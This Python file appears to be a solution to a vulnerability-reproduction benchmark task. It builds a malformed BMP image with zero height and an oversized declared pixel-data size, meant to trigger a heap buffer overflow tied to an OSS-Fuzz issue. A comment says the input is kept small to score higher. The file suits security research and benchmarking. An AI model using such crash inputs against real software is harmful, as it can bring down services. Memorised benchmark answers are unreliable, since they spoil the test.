import struct

class Solution:
    """
    Generates a Proof-of-Concept (PoC) input that triggers a Heap Buffer Overflow
    in a target vulnerable to oss-fuzz:42536646.
    """
    def solve(self, src_path: str) -> bytes:
        """
        Generates a PoC that triggers the vulnerability.

        The vulnerability is caused by not checking for zero width or height in an image,
        leading to a heap buffer overflow. This PoC crafts a BMP file with a height of 0.
        A memory buffer is likely allocated based on width * height, resulting in a
        zero-sized or very small allocation. The code then might attempt to read pixel
        data based on the `biSizeImage` field from the header, causing an overflow.

        Args:
            src_path: Path to the vulnerable source code tarball (unused).

        Returns:
            bytes: The PoC input (a malicious BMP file).
        """
        
        # A data size large enough to cause a reliable crash but smaller than the
        # ground-truth PoC to achieve a higher score.
        data_size = 1024 
        
        # Standard BMP headers size: 14 bytes for file header + 40 bytes for info header
        file_header_size = 14
        info_header_size = 40
        header_size = file_header_size + info_header_size
        
        file_size = header_size + data_size

        # BITMAPFILEHEADER (14 bytes)
        # We construct this by concatenating the 'BM' magic bytes with the
        # packed struct of the remaining fields.
        file_header = b'BM' + struct.pack(
            '<IHHI',      # Little-endian format string
            file_size,   # bfSize: Total file size
            0,           # bfReserved1
            0,           # bfReserved2
            header_size  # bfOffBits: Offset to pixel data
        )

        # BITMAPINFOHEADER (40 bytes)
        info_header = struct.pack(
            '<IiiHHIIiiII',  # Little-endian format string
            info_header_size, # biSize: Size of this header
            1,                # biWidth: A non-zero width
            0,                # biHeight: The vulnerability trigger (zero height)
            1,                # biPlanes
            24,               # biBitCount: 24 bits per pixel
            0,                # biCompression: BI_RGB (no compression)
            data_size,        # biSizeImage: Declared size of pixel data for overflow
            0,                # biXPelsPerMeter
            0,                # biYPelsPerMeter
            0,                # biClrUsed
            0                 # biClrImportant
        )

        # Pixel data that will be written out of bounds
        pixel_data = b'\x41' * data_size

        poc = file_header + info_header + pixel_data
        
        return poc
